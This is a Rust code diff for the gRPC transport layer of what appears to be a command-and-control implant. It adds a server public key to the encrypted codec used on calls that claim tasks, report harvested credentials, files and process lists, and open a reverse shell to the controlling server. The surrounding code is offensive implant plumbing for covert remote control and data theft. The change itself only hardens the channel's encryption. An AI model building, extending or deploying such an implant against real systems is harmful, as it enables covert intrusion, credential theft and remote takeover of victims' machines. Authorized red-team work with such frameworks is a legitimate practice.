@@ -19,11 +19,12 @@ static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 
 #[derive(Debug, Clone)]
 pub struct GRPC {
+    server_pubkey: [u8; 32],
     grpc: tonic::client::Grpc<tonic::transport::Channel>,
 }
 
 impl Transport for GRPC {
-    fn new(callback: String, proxy_uri: Option<String>) -> Result<Self> {
+    fn new(callback: String, server_pubkey: [u8; 32], proxy_uri: Option<String>) -> Result<Self> {
         let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
 
         let mut http = hyper::client::HttpConnector::new();
@@ -49,7 +50,10 @@ impl Transport for GRPC {
         };
 
         let grpc = tonic::client::Grpc::new(channel);
-        Ok(Self { grpc })
+        Ok(Self {
+            grpc,
+            server_pubkey,
+        })
     }
 
     async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
@@ -187,7 +191,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec = pb::xchacha::ChachaCodec::default();
+        let codec = pb::xchacha::ChachaCodec::new(self.server_pubkey);
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -216,7 +220,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec = pb::xchacha::ChachaCodec::default();
+        let codec = pb::xchacha::ChachaCodec::new(self.server_pubkey);
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -236,7 +240,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec = pb::xchacha::ChachaCodec::default();
+        let codec = pb::xchacha::ChachaCodec::new(self.server_pubkey);
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_CREDENTIAL_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -261,7 +265,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec = pb::xchacha::ChachaCodec::default();
+        let codec = pb::xchacha::ChachaCodec::new(self.server_pubkey);
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
         let mut req = request.into_streaming_request();
         req.extensions_mut()
@@ -282,7 +286,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec = pb::xchacha::ChachaCodec::default();
+        let codec = pb::xchacha::ChachaCodec::new(self.server_pubkey);
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -302,7 +306,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec = pb::xchacha::ChachaCodec::default();
+        let codec = pb::xchacha::ChachaCodec::new(self.server_pubkey);
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -323,7 +327,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec = pb::xchacha::ChachaCodec::default();
+        let codec = pb::xchacha::ChachaCodec::new(self.server_pubkey);
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
         let mut req = request.into_streaming_request();
         req.extensions_mut()
